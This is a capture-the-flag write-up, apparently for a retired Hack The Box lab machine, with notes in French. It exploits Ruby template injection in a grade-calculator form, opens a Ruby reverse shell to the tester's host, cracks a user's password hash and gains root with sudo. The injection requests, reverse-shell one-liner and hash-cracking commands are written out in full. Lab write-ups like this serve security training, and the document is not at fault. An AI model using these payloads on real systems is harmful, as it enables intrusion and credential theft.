# Perfecttion
```shell
nmap -sV -sC 10.10.11.253
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   256 80e479e85928df952dad574a4604ea70 (ECDSA)
        |_  256 e9ea0c1d8613ed95a9d00bc822e4cfe9 (ED25519)
        80/tcp open  http    nginx
        |_http-title: Weighted Grade Calculator
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne

ffuf -u 'http://10.10.11.253/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/big.txt
about

curl -IL http://10.10.11.253/weighted-grade                                                 
        HTTP/1.1 200 OK
        Server: nginx
        Date: Tue, 21 May 2024 07:49:02 GMT
        Content-Type: text/html;charset=utf-8
        Content-Length: 5191
        Connection: keep-alive
        X-Xss-Protection: 1; mode=block
        X-Content-Type-Options: nosniff
        X-Frame-Options: SAMEORIGIN
        Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07
searchsploit "webrick"
# ya rien 
# on search sur forum, on find que possible ssti
# on recup requete post pour le weight et on rentre valide input pour voir ce qui est reflete
# on find que param category est refleter, on sait que ruby backend on try basic ssti <%= 3 * 3 %>
# il y a filtre, on search pour bbypass filter sur google, on try ce blog https://blog.devops.dev/ssti-bypass-filter-0-9a-z-i-08a5b3b98def, on reproduit la meme chose et on a requete suivant 
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 219
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=test&grade1=10&weight1=25&category2=test2&grade2=20&weight2=0&category3=test3&grade3=20&weight3=20&category4=test4&grade4=10&weight4=25&category5=test%0A%3C%25=%203%20*%203%20%25%3E%0Atest&grade5=40&weight5=
# good on a le code qui sesxecute, on va rce a laide de https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
# on liste /home 
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 230
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=test&grade1=10&weight1=25&category2=test2&grade2=20&weight2=0&category3=test3&grade3=20&weight3=20&category4=test4&grade4=10&weight4=25&category5=test%0A%3C%25=%20Dir.entries('/home')%20%25%3E%0Atest&grade5=40&weight5=30
# on va recup fist flag 
# on try cmd injection 
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=test&grade1=10&weight1=25&category2=test2&grade2=20&weight2=0&category3=test3&grade3=20&weight3=20&category4=test4&grade4=10&weight4=25&category5=test%0A%3C%25=%20%60ls%20/%60%20%25%3E%0Atest&grade5=40&weight5=30
# good ca passe, on va rce
nc -lvnp 4444
# on va use ruby rce avec revshells.com 
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.47",4444))'
# requete
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 314
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=test&grade1=10&weight1=25&category2=test2&grade2=20&weight2=0&category3=test3&grade3=20&weight3=20&category4=test4&grade4=10&weight4=25&category5=test%0A%3C%25=%20%60ruby%20-rsocket%20-e'spawn(%22sh%22,%5B:in,:out,:err%5D=%3ETCPSocket.new(%2210.10.16.47%22,4444))'%60%20%25%3E%0Atest&grade5=40&weight5=30
# stabilise shell 
/bin/sh -i
# on upload linpeas.sh
# lauch 
bash linpeas.sh
# on find un mail 
cat /var/mail/susan
# il specifie le format des passwords, on genere wordlist 
for i in {1..1000}
do
echo "susan_nasus_${i}"
done > wordlist
# on find dans Migration dossier un hash de susan, on va brutforce avec hashcat et wordlist 
# on genere wordlist au fur et a mesure si on find pas mdp, en augmeente les nombre a la fin, exemple 
for i in {10000000..100000000}    
do
echo "susan_nasus_${i}"
done > wordlist
hashcat -m 1400 -a 0 hash wordlist
for i in {100000..1000000}    
do
echo "susan_nasus_${i}"
done > wordlist
hashcat -m 1400 -a 0 hash wordlist
# on le find 
for i in {300000000..500000000} 
do
echo "susan_nasus_${i}"
done > wordlist
# crack 
hashcat -m 1400 -a 0 hash wordlist
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
# go, le user appartient a sudo 
sudo -S -l # -S car pas interactive shell
# on a ALL:ALL, il faut faire sudo su
sudo su
# root!!
```
